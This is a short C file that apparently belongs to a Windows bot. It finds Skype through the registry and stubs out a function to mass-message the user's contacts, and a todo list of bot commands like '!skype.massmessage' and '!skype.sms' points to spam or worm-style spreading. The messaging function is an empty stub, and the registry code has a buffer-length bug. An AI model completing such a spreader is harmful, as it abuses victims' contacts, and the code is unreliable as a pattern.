#include "../Includes/includes.h"

bool SkypeExists(char *pcOutBuffer, int nBufferSize)
{
    bool bReturn = FALSE;

    HKEY hKey = NULL;
    if(RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Skype\\Phone", NULL, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
    {
        char cKeyValue[MAX_PATH];
        memset(cKeyValue, 0, sizeof(cKeyValue));

        if(RegQueryValueExA(hKey, "SkypePath", NULL, NULL, (BYTE *)cKeyValue, NULL) == ERROR_SUCCESS)
        {
            if(strlen(cKeyValue) <= nBufferSize)
            {
                strcpy(pcOutBuffer, cKeyValue);
                bReturn = TRUE;
            }
        }
    }

    RegCloseKey(hKey);

    return bReturn;
}

int MassMessageSkypeContacts(const char *cSkypePath, const char *cMessage)
{
    int nSentMessages = 0;

    unsigned int uiSkypeControlAPIDiscover = RegisterWindowMessage("SkypeControlAPIDiscover");
    unsigned int uiSkypeControlAPIAttach = RegisterWindowMessage("SkypeControlAPIAttach");

    if(uiSkypeControlAPIDiscover == 0 || uiSkypeControlAPIAttach == 0)
        return -1;

    return nSentMessages;
}

/* todo:
!skype.massmessage
!skype.contactcount
!skype.call
!skype.sms
!skype.request
*/
